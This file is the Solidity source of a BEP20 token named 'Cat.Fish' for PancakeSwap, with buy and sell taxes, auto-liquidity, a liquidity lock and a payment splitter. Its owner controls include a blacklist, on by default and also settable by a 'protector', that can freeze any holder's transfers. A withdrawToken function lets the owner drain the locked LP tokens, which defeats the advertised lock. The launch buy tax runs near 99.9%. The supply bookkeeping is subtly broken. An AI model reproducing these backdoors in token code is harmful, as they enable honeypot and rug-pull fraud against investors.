// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract Catfish is IBEP20, Ownable
{
  
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    mapping(address => bool) public excludedFromFees;
    mapping(address=>bool) public isPair;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint private InitialSupply;
    uint private constant DefaultLiquidityLockTime=7 days;
    address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint  private deployerBalance=_circulatingSupply;
    uint public _circulatingSupply = InitialSupply;
    uint public buyTax = 150;
    uint public sellTax = 150;
    uint public transferTax = 0;
    uint public liquidityTax=250;
    uint public splitterTax=750;
    uint constant TAX_DENOMINATOR=1000;
    uint constant MAXTAXDENOMINATOR=20;
    
    address public _pancakePairAddress; 
    IPancakeRouter private  _pancakeRouter;

    
    bool public contractLaunched = false;
    
    address public paymentSplitter;
    address public protector;
    modifier onlyProtector() {
        require(msg.sender == protector);
        _;
    }
    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;
    
    
    constructor () {
        _approve(msg.sender, PancakeRouter, type(uint256).max);
        _approve(address(this), PancakeRouter, type(uint256).max);

        paymentSplitter=0xB039A06400Cf4f075fC134d1ccC39460F629a447;

        excludedFromFees[msg.sender]=true;
        excludedFromFees[PancakeRouter]=true;
        excludedFromFees[address(this)]=true;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }

    function ghostLaunch(address[] memory accounts, uint256[] memory amounts, uint8 dec, uint _starting) public onlyOwner {
        require(!contractLaunched, "1");
        require(accounts.length < 200, "2");
        require(accounts.length == amounts.length, "3");
        _decimals = dec;
        InitialSupply = _starting * (10**_decimals);
        deployerBalance = InitialSupply;
        _name = "Cat.Fish";
        _symbol = "CFSH";
        _pancakeRouter = IPancakeRouter(PancakeRouter);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        isPair[_pancakePairAddress] = true;
        contractLaunched = true;     
        _balances[owner()] = deployerBalance;
        emit Transfer(address(0), owner(), deployerBalance);

        _approve(address(this), address(_pancakeRouter), type(uint256).max);

        for(uint256 i = 0; i < accounts.length; i++){
            uint256 amount = amounts[i] * 10**_decimals;
            _transfer(owner(), accounts[i], amount);
        }

        _transfer(owner(), address(this), balanceOf(owner()));

        _pancakeRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        SetupEnableTrading();
    }
    
    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }
    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }
    function protector_function(address[] calldata addresses, bool status) public onlyProtector {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }
    function setProtector(address _protector) external onlyOwner {
        protector = _protector;
    }
    function ChangePaymentSplitter(address newWallet) public onlyOwner{
        paymentSplitter=newWallet;
    }

    function _transfer(address sender, address recipient, uint amount) private{
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");
        if(blacklistMode){
            require(!isBlacklisted[sender] && !isBlacklisted[recipient],"Blacklisted");    
        }
        if(excludedFromFees[sender] || excludedFromFees[recipient])
            _feelessTransfer(sender, recipient, amount);
        else{ 
            require(LaunchTimestamp>0,"trading not yet enabled");
            _taxedTransfer(sender,recipient,amount);                  
        }
        
    }
    function _taxedTransfer(address sender, address recipient, uint amount) private{
        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        bool isBuy=isPair[sender];
        bool isSell=isPair[recipient];
        uint tax;
        if(isSell){
            uint SellTaxDuration=30 minutes;        
            if(block.timestamp<LaunchTimestamp+SellTaxDuration){
                tax=_getStartTax(SellTaxDuration,200);
                }else tax=sellTax;
            }
        else if(isBuy){
            uint BuyTaxDuration=60 seconds;
            if(block.timestamp<LaunchTimestamp+BuyTaxDuration){
                tax=_getStartTax(BuyTaxDuration,999);
            }else tax=buyTax;
        } else tax=transferTax;

        if((sender!=_pancakePairAddress)&&(!manualSwap)&&(!_isSwappingContractModifier))
            _swapContractToken(false);
        uint contractToken=_calculateFee(amount, tax, splitterTax+liquidityTax);
        uint taxedAmount=amount-contractToken;

        _balances[sender]-=amount;
        _balances[address(this)] += contractToken;
        _balances[recipient]+=taxedAmount;
        
        emit Transfer(sender,recipient,taxedAmount);
    }
    function _getStartTax(uint duration, uint maxTax) private view returns (uint){
        uint timeSinceLaunch=block.timestamp-LaunchTimestamp;
        return maxTax-((maxTax-50)*timeSinceLaunch/duration);
    }
    function _calculateFee(uint amount, uint tax, uint taxPercent) private pure returns (uint) {
        return (amount*tax*taxPercent) / (TAX_DENOMINATOR*TAX_DENOMINATOR);
    }
    function _feelessTransfer(address sender, address recipient, uint amount) private{
        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _balances[sender]-=amount;
        _balances[recipient]+=amount;      
        emit Transfer(sender,recipient,amount);
    }
    
    bool private _isSwappingContractModifier;
    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }
    uint public swapTreshold=2;
    function setSwapTreshold(uint newSwapTresholdPermille) public onlyOwner{
        require(newSwapTresholdPermille<=10);//MaxTreshold= 1%
        swapTreshold=newSwapTresholdPermille;
    }
    uint public overLiquifyTreshold=150;
    function SetOverLiquifiedTreshold(uint newOverLiquifyTresholdPermille) public onlyOwner{
        require(newOverLiquifyTresholdPermille<=1000);
        overLiquifyTreshold=newOverLiquifyTresholdPermille;
    }
    event OnSetTaxes(uint buy, uint sell, uint transfer_, uint splitter,uint liquidity);
    function SetTaxes(uint buy, uint sell, uint transfer_, uint splitter,uint liquidity) public onlyOwner{
        uint maxTax=TAX_DENOMINATOR/MAXTAXDENOMINATOR;
        require(buy<=maxTax&&sell<=maxTax&&transfer_<=maxTax,"Tax exceeds maxTax");
        require(splitter+liquidity==TAX_DENOMINATOR,"Taxes don't add up to denominator");
        
        buyTax=buy;
        sellTax=sell;
        transferTax=transfer_;
        splitterTax=splitter;
        liquidityTax=liquidity;
        emit OnSetTaxes(buy, sell, transfer_, splitter,liquidity);
    }
    
    function isOverLiquified() public view returns(bool){
        return _balances[_pancakePairAddress]>_circulatingSupply*overLiquifyTreshold/1000;
    }
    function _swapContractToken(bool ignoreLimits) private lockTheSwap{
        uint contractBalance=_balances[address(this)];
        uint totalTax=liquidityTax+splitterTax;
        uint tokenToSwap=_balances[_pancakePairAddress]*swapTreshold/1000;
        if(totalTax==0)return;
        if(ignoreLimits)
            tokenToSwap=_balances[address(this)];
        else if(contractBalance<tokenToSwap)
            return;
        uint tokenForLiquidity=isOverLiquified()?0:(tokenToSwap*liquidityTax)/totalTax;

        uint tokenForSplitter= tokenToSwap-tokenForLiquidity;

        uint LiqHalf=tokenForLiquidity/2;
        uint swapToken=LiqHalf+tokenForSplitter;
        uint initialBNBBalance = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint newBNB=(address(this).balance - initialBNBBalance);
        if(tokenForLiquidity>0){
            uint liqBNB = (newBNB*LiqHalf)/swapToken;
            _addLiquidity(LiqHalf, liqBNB);
        }
        (bool sent,)=paymentSplitter.call{value:address(this).balance}("");
        sent=true;
    }
    function _swapTokenForBNB(uint amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();

        try _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        ){}
        catch{}
    }
    function _addLiquidity(uint tokenamount, uint bnbamount) private {
        _approve(address(this), address(_pancakeRouter), tokenamount);
        _pancakeRouter.addLiquidityETH{value: bnbamount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
    function getLiquidityReleaseTimeInSeconds() public view returns (uint){
        if(block.timestamp<_liquidityUnlockTime)
            return _liquidityUnlockTime-block.timestamp;
        return 0;
    }
    function getBurnedTokens() public view returns(uint){
        return (InitialSupply-_circulatingSupply)+_balances[address(0xdead)];
    }
    function SetPair(address Pair, bool Add) public onlyOwner{
        require(Pair!=_pancakePairAddress,"can't change pancake");
        isPair[Pair]=Add;
    }
    
    bool public manualSwap;
    function SwitchManualSwap(bool manual) public onlyOwner{
        manualSwap=manual;
    }
    function SwapContractToken() public onlyOwner{
    _swapContractToken(true);
    }
    event ExcludeAccount(address account, bool exclude);
    function ExcludeAccountFromFees(address account, bool exclude) public onlyOwner{
        require(account!=address(this),"can't Include the contract");
        excludedFromFees[account]=exclude;
        emit ExcludeAccount(account,exclude);
    }
    event OnEnableTrading();
    uint public LaunchTimestamp;
    function SetupEnableTrading() public onlyOwner{
        require(LaunchTimestamp==0,"AlreadyLaunched");
        LaunchTimestamp=block.timestamp;
        emit OnEnableTrading();
    }
    uint _liquidityUnlockTime;
    bool public LPReleaseLimitedTo20Percent;
    function limitLiquidityReleaseTo20Percent() public onlyOwner{
        LPReleaseLimitedTo20Percent=true;
    }
    function LockLiquidityForSeconds(uint secondsUntilUnlock) public onlyOwner{
        _prolongLiquidityLock(secondsUntilUnlock+block.timestamp);
    }
    event OnProlongLPLock(uint UnlockTimestamp);
    function _prolongLiquidityLock(uint newUnlockTime) private{
        require(newUnlockTime>_liquidityUnlockTime);
        _liquidityUnlockTime=newUnlockTime;
        emit OnProlongLPLock(_liquidityUnlockTime);
    }
    event OnReleaseLP();
    function LiquidityRelease() public onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");

        IBEP20 liquidityToken = IBEP20(_pancakePairAddress);
        uint amount = liquidityToken.balanceOf(address(this));
        if(LPReleaseLimitedTo20Percent)
        {
            _liquidityUnlockTime=block.timestamp+DefaultLiquidityLockTime;
            amount=amount*2/10;
        }
        liquidityToken.transfer(msg.sender, amount);
        emit OnReleaseLP();
    }

    receive() external payable {}


    function getOwner() external view override returns (address) {
        return owner();
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint) {
        return InitialSupply;
    }

    function transfer(address recipient, uint amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) external view override returns (uint) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {
        uint currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance"); //Dev Pat
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function withdrawToken(address _tokenContract, uint256 _amount) external onlyOwner {
        IBEP20 tokenContract = IBEP20(_tokenContract);
        tokenContract.transfer(msg.sender, _amount);
    }
    function withdrawBNB(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

}